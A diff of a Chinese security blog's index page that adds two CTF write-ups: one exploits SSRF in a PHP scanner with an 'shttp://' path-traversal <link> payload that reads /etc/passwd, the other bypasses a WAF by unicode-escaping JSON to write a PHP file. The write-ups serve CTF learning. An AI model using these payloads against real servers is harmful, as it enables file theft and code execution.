@@ -454,6 +454,238 @@ module.exports = router;</code></pre>
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/babyphp_Write_Up.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/babyphp_Write_Up.html" class="post-title-link" itemprop="url">XCTF鲲鹏专场babyphp Write Up</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-23 12:44:00" itemprop="dateCreated datePublished" datetime="2020-12-23T12:44:00+08:00">2020-12-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-21 16:24:17" itemprop="dateModified" datetime="2021-01-21T16:24:17+08:00">2021-01-21</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="babyphp-Write-Up"><a href="#babyphp-Write-Up" class="headerlink" title="babyphp Write Up"></a>babyphp Write Up</h1><p>题目是一个内网的扫描器，直接扫描内网端口看看。抓包发现提示去谷歌搜索找源码</p>
+<p><img src="/Users/gqleung/picture/WX20201223-192602@2x.png" alt="WX20201223-192602@2x"></p>
+<p>谷歌搜到源码：</p>
+<pre><code class="php">&lt;?php
+
+set_time_limit(0);//设置程序执行时间
+ob_implicit_flush(True);
+ob_end_flush();
+$url = isset($_REQUEST[&#39;url&#39;])?$_REQUEST[&#39;url&#39;]:null; 
+
+/*端口扫描代码*/
+function check_port($ip,$port,$timeout=0.1) {
+ $conn = @fsockopen($ip, $port, $errno, $errstr, $timeout);
+ if ($conn) {
+ fclose($conn);
+ return true;
+ }
+}
+
+
+function scanip($ip,$timeout,$portarr){
+foreach($portarr as $port){
+if(check_port($ip,$port,$timeout=0.1)==True){
+echo &#39;Port: &#39;.$port.&#39; is open&lt;br/&gt;&#39;;
+@ob_flush();
+@flush();
+
+}
+
+}
+}
+
+echo &#39;&lt;html&gt;
+&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;startip&quot; value=&quot;Start IP&quot; /&gt;
+&lt;input type=&quot;text&quot; name=&quot;endip&quot; value=&quot;End IP&quot; /&gt;
+&lt;input type=&quot;text&quot; name=&quot;port&quot; value=&quot;80,8080,8888,1433,3306&quot; /&gt;
+Timeout&lt;input type=&quot;text&quot; name=&quot;timeout&quot; value=&quot;10&quot; /&gt;&lt;br/&gt;
+&lt;button type=&quot;submit&quot; name=&quot;submit&quot;&gt;Scan&lt;/button&gt;
+&lt;/form&gt;
+&lt;/html&gt;
+&#39;;
+
+if(isset($_POST[&#39;startip&#39;])&amp;&amp;isset($_POST[&#39;endip&#39;])&amp;&amp;isset($_POST[&#39;port&#39;])&amp;&amp;isset($_POST[&#39;timeout&#39;])){
+
+$startip=$_POST[&#39;startip&#39;];
+$endip=$_POST[&#39;endip&#39;];
+$timeout=$_POST[&#39;timeout&#39;];
+$port=$_POST[&#39;port&#39;];
+$portarr=explode(&#39;,&#39;,$port);
+$siparr=explode(&#39;.&#39;,$startip);
+$eiparr=explode(&#39;.&#39;,$endip);
+$ciparr=$siparr;
+if(count($ciparr)!=4||$siparr[0]!=$eiparr[0]||$siparr[1]!=$eiparr[1]){
+exit(&#39;IP error: Wrong IP address or Trying to scan class A address&#39;);
+}
+if($startip==$endip){
+echo &#39;Scanning IP &#39;.$startip.&#39;&lt;br/&gt;&#39;;
+@ob_flush();
+@flush();
+scanip($startip,$timeout,$portarr);
+@ob_flush();
+@flush();
+exit();
+}
+
+if($eiparr[3]!=255){
+$eiparr[3]+=1;
+}
+while($ciparr!=$eiparr){
+$ip=$ciparr[0].&#39;.&#39;.$ciparr[1].&#39;.&#39;.$ciparr[2].&#39;.&#39;.$ciparr[3];
+echo &#39;&lt;br/&gt;Scanning IP &#39;.$ip.&#39;&lt;br/&gt;&#39;;
+@ob_flush();
+@flush();
+scanip($ip,$timeout,$portarr);
+$ciparr[3]+=1;
+
+if($ciparr[3]&gt;255){
+$ciparr[2]+=1;
+$ciparr[3]=0;
+}
+if($ciparr[2]&gt;255){
+$ciparr[1]+=1;
+$ciparr[2]=0;
+}
+}
+}
+
+/*内网代理代码*/
+
+function getHtmlContext($url){ 
+    $ch = curl_init(); 
+    curl_setopt($ch, CURLOPT_URL, $url); 
+    curl_setopt($ch, CURLOPT_HEADER, TRUE);    //表示需要response header 
+    curl_setopt($ch, CURLOPT_NOBODY, FALSE); //表示需要response body 
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); 
+    curl_setopt($ch, CURLOPT_TIMEOUT, 120); 
+    $result = curl_exec($ch); 
+  global $header; 
+  if($result){ 
+       $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE); 
+       $header = explode(&quot;\r\n&quot;,substr($result, 0, $headerSize)); 
+       $body = substr($result, $headerSize); 
+  } 
+    if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == &#39;200&#39;) { 
+        return $body; 
+    } 
+    if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == &#39;302&#39;) { 
+    $location = getHeader(&quot;Location&quot;); 
+    if(strpos(getHeader(&quot;Location&quot;),&#39;http://&#39;) == false){ 
+      $location = getHost($url).$location; 
+    } 
+        return getHtmlContext($location); 
+    } 
+    return NULL; 
+} 
+
+function getHost($url){ 
+    preg_match(&quot;/^(http:\/\/)?([^\/]+)/i&quot;,$url, $matches); 
+    return $matches[0]; 
+} 
+function getCss($host,$html){ 
+    preg_match_all(&quot;/&lt;link[\s\S]*?href=[&#39;\&quot;](.*?[.]css.*?)[\&quot;&#39;][\s\S]*?&gt;/i&quot;,$html, $matches); 
+    foreach($matches[1] as $v){ 
+    $cssurl = $v; 
+        if(strpos($v,&#39;http://&#39;) == false){ 
+      $cssurl = $host.&quot;/&quot;.$v; 
+    } 
+    $csshtml = &quot;&lt;style&gt;&quot;.file_get_contents($cssurl).&quot;&lt;/style&gt;&quot;; 
+    $html .= $csshtml; 
+  } 
+  return $html; 
+} 
+
+if($url != null){ 
+
+    $host = getHost($url); 
+    echo getCss($host,getHtmlContext($url)); 
+}
+?&gt;</code></pre>
+<p>发现除了代码功能还存在SSRF。通过GET传参，可以调用<code>getHtmlContext()</code>获取页面源码，而<code>getCss()</code>能够获取页面的CSS。<code>getHtmlContext()</code>虽然能够通过<code>file:\\</code>协议读取flag，但是返回的code必须是200才有可能返回内容，如果是这里getflag的话必须要让code为200，暂时不知道有没有方法，暂时放一边。</p>
+<p><img src="/Users/gqleung/picture/WX20201223-194621@2x.png" alt="WX20201223-194621@2x"></p>
+<p>第二个就是<code>getCss()</code>中的<code>file_get_contents()</code>,其中的参数<code>「$cssurl」</code>来源于<code>getHtmlContext()</code>读取远程页面内容中匹配到的<code>&lt;link&gt;</code>标签中的<code>href</code>.那么我们是否能够控制远程页面中的<code>&lt;link&gt;</code>标签中的<code>href</code>为flag地址，从而读取到flag呢？</p>
+<p><img src="/Users/gqleung/picture/WX20201223-195012@2x.png" alt="WX20201223-195012@2x"></p>
+<p>但是这个正则表达式需要匹配css文件，但是这歌正则只需要含有<code>.css</code>这个关键字即可。</p>
+<p><img src="/Users/gqleung/picture/WX20201223-195239@2x.png" alt="WX20201223-195239@2x"></p>
+<p>但是代码中需要含有<code>http://</code>否则会自动拼接一个<code>http://host</code></p>
+<p><img src="/Users/gqleung/picture/WX20201223-195416@2x.png" alt="WX20201223-195416@2x"></p>
+<p>我们知道<code>file_get_contents</code>这个函数在遇到不认识的协议头会造成目录穿越问题。同时<code>strpos($v,&#39;http://&#39;)</code>只是字符串中是否存在<code>http://</code>而没有写死。我们只需要添加协议头中含有<code>http：//</code>即可。例如：<code>shttp://</code>所以我们构造如下payload即可：</p>
+<pre><code class="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot;  href=&quot;shttp:///../../../../../../../../../etc/password/.css/../../../../../../etc/passwd&quot; /&gt;</code></pre>
+<p>将上面payload保存的自己的服务器，再提交给靶机即可直接读取到/etc/passwd</p>
+<p><img src="/Users/gqleung/picture/WX20201223-200254@2x.png" alt="WX20201223-200254@2x"></p>
+<p>修改一下读取flag。</p>
+<p><img src="/Users/gqleung/picture/WX20201223-200056@2x.png" alt="WX20201223-200056@2x"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/58699674516d08.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1596,6 +1828,214 @@ echo $open_php;
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/2a808de4a49b19.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/2a808de4a49b19.html" class="post-title-link" itemprop="url">西湖论剑Easyjson Write up</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-09 14:33:08 / 修改时间：18:57:51" itemprop="dateCreated datePublished" datetime="2020-10-09T14:33:08+08:00">2020-10-09</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>太菜了只做了一道</p>
+</blockquote>
+<h2 id="Easyjson"><a href="#Easyjson" class="headerlink" title="Easyjson"></a>Easyjson</h2><ul>
+<li>代码审计</li>
+</ul>
+<pre><code class="php"> &lt;?php
+include &#39;security.php&#39;;
+
+if(!isset($_GET[&#39;source&#39;])){
+    show_source(__FILE__);
+    die();
+}
+$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
+var_dump($sandbox);
+if(!file_exists($sandbox)){
+    mkdir($sandbox);
+    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
+}
+$action = $_GET[&#39;action&#39;];
+$content = file_get_contents(&quot;php://input&quot;);
+
+
+if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
+    $content = json_decode($content);
+    $filename = $_GET[&#39;filename&#39;];
+    $filecontent = $content-&gt;content;
+    $filename = $sandbox.$filename;
+    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
+}elseif($action == &quot;reset&quot;){
+    $files = scandir($sandbox);
+    foreach($files as $file) {
+        if(!is_dir($file)){
+            if($file !== &quot;index.php&quot;){
+                unlink($sandbox.$file);
+            }
+        }
+    }
+}
+else{
+    die(&#39;Security Check Failed.&#39;);
+}
+</code></pre>
+<ul>
+<li>代码主要部分在,但是这里有一个waf对文件名和content参数进行过滤。简单Fuzz了一下，filename可以使用php后缀，说明可以写php文件，但是有一个很关键的问题就是<code>content</code>它传来必须是一个json,json中有一个属性是content，例如：<code>{&#39;content&#39;:&#39;&lt;?=phpinfo()?&gt;&#39;}</code>但是<code>waf</code>对json进行了过滤，不能存在content这个字符串(还过滤了其他关键字)。</li>
+</ul>
+<pre><code class="php">if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
+    $content = json_decode($content);
+    $filename = $_GET[&#39;filename&#39;];
+    $filecontent = $content-&gt;content;
+    $filename = $sandbox.$filename;
+    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
+}</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001234@2x.png" alt="WX20201009-001234@2x"></p>
+<ul>
+<li>神小密圈发现，json支持的字符中可以支持unicode编码，那么我们全都用unicode编码来代替字符串不就行了？</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG59.jpeg" alt="WechatIMG59"></p>
+<ul>
+<li>简单测试一下发现可以.<a href="https://blog.csdn.net/weixin_30654419/article/details/97554779?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param" target="_blank" rel="noopener">Unicode表</a></li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG72.png" alt="WechatIMG72"></p>
+<ul>
+<li>简单写个脚本来将字符串转化为unicode编码。</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+function unicode_encode($str){
+    $table = [
+            &#39;\u002&#39;=&gt;[&#39; &#39;,&#39;!&#39;,&#39;&quot;&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,&#39;&amp;&#39;,&#39;\&#39;&#39;,&#39;(&#39;,&#39;)&#39;,&#39;*&#39;,&#39;+&#39;,&#39;,&#39;,&#39;-&#39;,&#39;.&#39;,&#39;/&#39;],
+            &#39;\u003&#39;=&gt;[&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;:&#39;,&#39;;&#39;,&#39;&lt;&#39;,&#39;=&#39;,&#39;&gt;&#39;,&#39;?&#39;],
+            &#39;\u004&#39;=&gt;[&#39;@&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;],
+            &#39;\u005&#39;=&gt;[&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;[&#39;,&#39;\\&#39;,&#39;]&#39;,&#39;^&#39;,&#39;_&#39;],
+            &#39;\u006&#39;=&gt;[&#39;`&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;],
+            &#39;\u007&#39;=&gt;[&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;{&#39;,&#39;|&#39;,&#39;}&#39;,&#39;~&#39;]
+];
+    foreach ($table as $key =&gt; $value) {
+        $i = 0;
+        foreach ($value as $vcode) {
+            $i=$i+1;
+            if($str==$vcode){
+                return $key.bin2e($i-1);
+            }
+
+        }
+    }
+
+}
+
+function bin2e($str){
+    switch ($str) {
+        case &#39;10&#39;:
+            return &#39;a&#39;;
+            break;
+        case &#39;11&#39;:
+            return &#39;b&#39;;
+            break;
+        case &#39;12&#39;:
+            return &#39;c&#39;;
+            break;
+        case &#39;13&#39;:
+            return &#39;d&#39;;
+            break;
+        case &#39;14&#39;:
+            return &#39;e&#39;;
+            break;
+        case &#39;15&#39;:
+            return &#39;f&#39;;
+            break;
+        default:
+            return $str;
+            break;
+    }
+}
+
+function main($str){
+for($i=0;$i&lt;strlen($str);$i++){
+    echo unicode_encode($str[$i]);
+}
+}
+
+
+main(&#39;&lt;?=phpinfo()?&gt;&#39;);
+?&gt;</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000458@2x.png" alt="WX20201009-000458@2x"></p>
+<ul>
+<li>EXP</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000600@2x.png" alt="WX20201009-000600@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000806@2x.png" alt="WX20201009-000806@2x"></p>
+<ul>
+<li>Getflag</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001124@2x.png" alt="WX20201009-001124@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001031@2x.png" alt></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000938@2x.png" alt="WX20201009-000938@2x"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/159ab5557e.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2040,511 +2480,6 @@ main(&#39;&lt;?=phpinfo()?&gt;&#39;);
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/2a808de4a49b19.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/2a808de4a49b19.html" class="post-title-link" itemprop="url">西湖论剑Easyjson Write up</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-10-09 14:33:08 / 修改时间：18:57:51" itemprop="dateCreated datePublished" datetime="2020-10-09T14:33:08+08:00">2020-10-09</time>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>太菜了只做了一道</p>
-</blockquote>
-<h2 id="Easyjson"><a href="#Easyjson" class="headerlink" title="Easyjson"></a>Easyjson</h2><ul>
-<li>代码审计</li>
-</ul>
-<pre><code class="php"> &lt;?php
-include &#39;security.php&#39;;
-
-if(!isset($_GET[&#39;source&#39;])){
-    show_source(__FILE__);
-    die();
-}
-$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
-var_dump($sandbox);
-if(!file_exists($sandbox)){
-    mkdir($sandbox);
-    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
-}
-$action = $_GET[&#39;action&#39;];
-$content = file_get_contents(&quot;php://input&quot;);
-
-
-if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
-    $content = json_decode($content);
-    $filename = $_GET[&#39;filename&#39;];
-    $filecontent = $content-&gt;content;
-    $filename = $sandbox.$filename;
-    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
-}elseif($action == &quot;reset&quot;){
-    $files = scandir($sandbox);
-    foreach($files as $file) {
-        if(!is_dir($file)){
-            if($file !== &quot;index.php&quot;){
-                unlink($sandbox.$file);
-            }
-        }
-    }
-}
-else{
-    die(&#39;Security Check Failed.&#39;);
-}
-</code></pre>
-<ul>
-<li>代码主要部分在,但是这里有一个waf对文件名和content参数进行过滤。简单Fuzz了一下，filename可以使用php后缀，说明可以写php文件，但是有一个很关键的问题就是<code>content</code>它传来必须是一个json,json中有一个属性是content，例如：<code>{&#39;content&#39;:&#39;&lt;?=phpinfo()?&gt;&#39;}</code>但是<code>waf</code>对json进行了过滤，不能存在content这个字符串(还过滤了其他关键字)。</li>
-</ul>
-<pre><code class="php">if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
-    $content = json_decode($content);
-    $filename = $_GET[&#39;filename&#39;];
-    $filecontent = $content-&gt;content;
-    $filename = $sandbox.$filename;
-    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
-}</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001234@2x.png" alt="WX20201009-001234@2x"></p>
-<ul>
-<li>神小密圈发现，json支持的字符中可以支持unicode编码，那么我们全都用unicode编码来代替字符串不就行了？</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG59.jpeg" alt="WechatIMG59"></p>
-<ul>
-<li>简单测试一下发现可以.<a href="https://blog.csdn.net/weixin_30654419/article/details/97554779?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param" target="_blank" rel="noopener">Unicode表</a></li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG72.png" alt="WechatIMG72"></p>
-<ul>
-<li>简单写个脚本来将字符串转化为unicode编码。</li>
-</ul>
-<pre><code class="php">&lt;?php
-
-function unicode_encode($str){
-    $table = [
-            &#39;\u002&#39;=&gt;[&#39; &#39;,&#39;!&#39;,&#39;&quot;&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,&#39;&amp;&#39;,&#39;\&#39;&#39;,&#39;(&#39;,&#39;)&#39;,&#39;*&#39;,&#39;+&#39;,&#39;,&#39;,&#39;-&#39;,&#39;.&#39;,&#39;/&#39;],
-            &#39;\u003&#39;=&gt;[&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;:&#39;,&#39;;&#39;,&#39;&lt;&#39;,&#39;=&#39;,&#39;&gt;&#39;,&#39;?&#39;],
-            &#39;\u004&#39;=&gt;[&#39;@&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;],
-            &#39;\u005&#39;=&gt;[&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;[&#39;,&#39;\\&#39;,&#39;]&#39;,&#39;^&#39;,&#39;_&#39;],
-            &#39;\u006&#39;=&gt;[&#39;`&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;],
-            &#39;\u007&#39;=&gt;[&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;{&#39;,&#39;|&#39;,&#39;}&#39;,&#39;~&#39;]
-];
-    foreach ($table as $key =&gt; $value) {
-        $i = 0;
-        foreach ($value as $vcode) {
-            $i=$i+1;
-            if($str==$vcode){
-                return $key.bin2e($i-1);
-            }
-
-        }
-    }
-
-}
-
-function bin2e($str){
-    switch ($str) {
-        case &#39;10&#39;:
-            return &#39;a&#39;;
-            break;
-        case &#39;11&#39;:
-            return &#39;b&#39;;
-            break;
-        case &#39;12&#39;:
-            return &#39;c&#39;;
-            break;
-        case &#39;13&#39;:
-            return &#39;d&#39;;
-            break;
-        case &#39;14&#39;:
-            return &#39;e&#39;;
-            break;
-        case &#39;15&#39;:
-            return &#39;f&#39;;
-            break;
-        default:
-            return $str;
-            break;
-    }
-}
-
-function main($str){
-for($i=0;$i&lt;strlen($str);$i++){
-    echo unicode_encode($str[$i]);
-}
-}
-
-
-main(&#39;&lt;?=phpinfo()?&gt;&#39;);
-?&gt;</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000458@2x.png" alt="WX20201009-000458@2x"></p>
-<ul>
-<li>EXP</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000600@2x.png" alt="WX20201009-000600@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000806@2x.png" alt="WX20201009-000806@2x"></p>
-<ul>
-<li>Getflag</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001124@2x.png" alt="WX20201009-001124@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001031@2x.png" alt></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000938@2x.png" alt="WX20201009-000938@2x"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d8314f80a5.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d8314f80a5.html" class="post-title-link" itemprop="url">羊城杯部分Write Up</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-09-12 12:44:00" itemprop="dateCreated datePublished" datetime="2020-09-12T12:44:00+08:00">2020-09-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
